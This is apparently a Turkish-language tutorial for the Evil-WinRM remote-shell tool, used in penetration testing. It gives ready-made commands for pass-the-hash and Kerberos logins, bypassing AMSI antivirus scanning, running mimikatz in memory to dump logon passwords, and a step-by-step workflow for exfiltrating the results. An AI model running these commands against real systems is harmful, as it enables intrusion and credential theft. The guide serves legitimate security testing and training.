# 😈 Evil-WinRM - Windows Uzak Kabuk Kılavuzu

[🇬🇧 English](../../README.md)

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 Nihai WinRM Kabuk Aracı
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 İçindekiler

- [Evil-WinRM Nedir?](#-evil-winrm-nedir)
- [Kurulum](#-kurulum)
- [Temel Bağlantı](#-temel-bağlantı)
- [Dosya İşlemleri](#-dosya-i̇şlemleri)
- [Dahili Komutlar](#-dahili-komutlar)
- [Pass-the-Hash (Hash ile Kimlik Doğrulama)](#-pass-the-hash-hash-ile-kimlik-doğrulama)
- [Kerberos Kimlik Doğrulama](#-kerberos-kimlik-doğrulama)
- [Hızlı Başvuru](#-hızlı-başvuru)

---

## 🎯 Evil-WinRM Nedir?

**Evil-WinRM**, sızma testleri ve güvenlik denetimleri için geliştirilmiş, gelişmiş özelliklere sahip bir WinRM kabuk aracıdır:

- 🖥️ **Etkileşimli Kabuk** - Tam PowerShell oturumu
- 📁 **Dosya Aktarımı** - Dosya yükleme (upload) ve indirme (download)
- 🔓 **Pass-the-Hash** - NTLM hash ile kimlik doğrulama
- 🎫 **Kerberos** - Bilet tabanlı kimlik doğrulama desteği
- 🧩 **Modüller** - Belleğe doğrudan PowerShell betikleri yükleme

### WinRM Portları

| Port | Protokol | Notlar |
|------|----------|--------|
| 5985 | HTTP | Varsayılan (Şifrelenmemiş) |
| 5986 | HTTPS | Şifrelenmiş (SSL/TLS) |

---

## 🚀 Kurulum

### Kali Linux

```bash
# Kurulum
sudo apt update
sudo apt install evil-winrm

# Veya Ruby gem ile
sudo gem install evil-winrm
```

### GitHub Üzerinden

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

## 💻 Temel Bağlantı

### Parola ile Kimlik Doğrulama

```bash
# Temel bağlantı
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Etki alanı (domain) belirterek
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS (port 5986) kullanımı
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Özel port belirterek
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

### SSL Seçenekleri

```bash
# Sertifika doğrulaması olmadan SSL kullanımı
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Sertifika belirterek
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

## 📁 Dosya İşlemleri

### Dosya Yükleme (Upload)

```bash
# Evil-WinRM kabuğu içerisinden
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# Belirli bir konuma yükleme
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Komut satırından çalıştırılabilir dizin belirterek (-e ile)
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

### Dosya İndirme (Download)

```bash
# Dosya indirme
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# Belirli bir yerel konuma indirme
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

### Yürütülebilir Dosya Dizini (-e Parametresi)

```bash
# Yüklemeler için yerel exe dizinini belirtin
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# Kabuk içinde doğrudan dosya adıyla yükleme yapın
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

## 🛠️ Dahili Komutlar

### Menü

```bash
# Kullanılabilir tüm özel komutları görüntüleme
*Evil-WinRM* PS C:\> menu
```

```text
# Kullanılabilir komutlar:
Bypass-4MSI       - AMSI korumasını atlatır
Dll-Loader        - Belleğe DLL yükler
Donut-Loader      - .NET derlemesini (assembly) belleğe yükler
Invoke-Binary     - İkili (binary) dosyayı bellekte çalıştırır
services          - Servisleri listeler
upload            - Dosya yükler
download          - Dosya indirir
```

### AMSI Atlatma (AMSI Bypass)

```bash
# AMSI korumasını devre dışı bırak
*Evil-WinRM* PS C:\> Bypass-4MSI

# Artık AV/EDR tarafından engellenen araçları bellekte çalıştırabilirsiniz
```

### Betikleri Belleğe Yükleme

```bash
# Betik dizini belirterek bağlanın
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# Kabuk içinde betiği çağırarak yükleyin
*Evil-WinRM* PS C:\> PowerView.ps1

# Betik içerisindeki fonksiyonları kullanın
*Evil-WinRM* PS C:\> Get-DomainUser
```

### Bellekte İkili Dosya Çalıştırma (In-Memory Execution)

```bash
# Yürütülebilir dosyaların bulunduğu dizini belirterek bağlanın
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# İkili dosyayı diske yazmadan bellekte çalıştırın
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# Argümanlar ile çalıştırma
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### DLL Yükleme

```bash
# DLL yükleme
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

### Servisleri Listeleme

```bash
# Servisleri listeleme
*Evil-WinRM* PS C:\> services
```

---

## 🔓 Pass-the-Hash (Hash ile Kimlik Doğrulama)

### NTLM Hash

```bash
# LM:NTLM formatında hash ile bağlanma
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Yalnızca NTLM hash parçası ile
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Etki alanı (domain) ile birlikte
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

## 🎫 Kerberos Kimlik Doğrulama

### Ortam Hazırlığı

```bash
# Bilet önbelleğini KRB5CCNAME değişkenine atayın
export KRB5CCNAME=/path/to/ticket.ccache

# Realm çözünürlüğü için /etc/krb5.conf dosyasını düzenleyin
```

### Kerberos ile Bağlantı

```bash
# Kerberos doğrulaması ile bağlanma
evil-winrm -i dc01.domain.local -r domain.local

# Belirli bir ccache dosyası belirterek
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

## 📊 Hızlı Başvuru

### Bağlantı Seçenekleri

| Seçenek | Açıklama |
|---------|----------|
| `-i` | Hedef IP adresi veya ana bilgisayar adı |
| `-u` | Kullanıcı adı |
| `-p` | Parola |
| `-H` | NTLM hash değeri |
| `-d` | Etki alanı (Domain) |
| `-S` | SSL (HTTPS) kullan |
| `-P` | Port numarası |
| `-r` | Kerberos realm adı |

### Dosya ve Betik Seçenekleri

| Seçenek | Açıklama |
|---------|----------|
| `-s` | PowerShell betikleri dizini |
| `-e` | Yürütülebilir dosyalar (exe) dizini |
| `-c` | SSL sertifikası |
| `-k` | SSL özel anahtarı (private key) |

### Kabuk İçi Komutlar

| Komut | Açıklama |
|-------|----------|
| `upload` | Dosya yükle |
| `download` | Dosya indir |
| `menu` | Dahili komutları listele |
| `Bypass-4MSI` | AMSI atlat |
| `Invoke-Binary` | Bellekte exe çalıştır |
| `services` | Servisleri listele |
| `Dll-Loader` | Belleğe DLL yükle |

### Yaygın İş Akışı

```bash
# 1. Hedefe bağlanın
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. AMSI engelini aşın
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Gerekli araçları yükleyin
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. Komutu çalıştırın
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. Sonuç dosyasını yerel makinenize indirin
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

## 📚 Kaynaklar

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [WinRM Dokümantasyonu](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

### İlgili Kılavuzlar
- [CrackMapExec](../../CrackMapExec/translations/README.tr.md)
- [Impacket](../../Impacket/translations/README.tr.md)
- [Mimikatz](../../Mimikatz/translations/README.tr.md)

---

<p align="center">
  <b>😈 Nihai WinRM Kabuk Deneyimi!</b><br>
  <i>Evil-WinRM - Windows sistemlerini uzaktan ustalıkla yönetin</i>
</p>
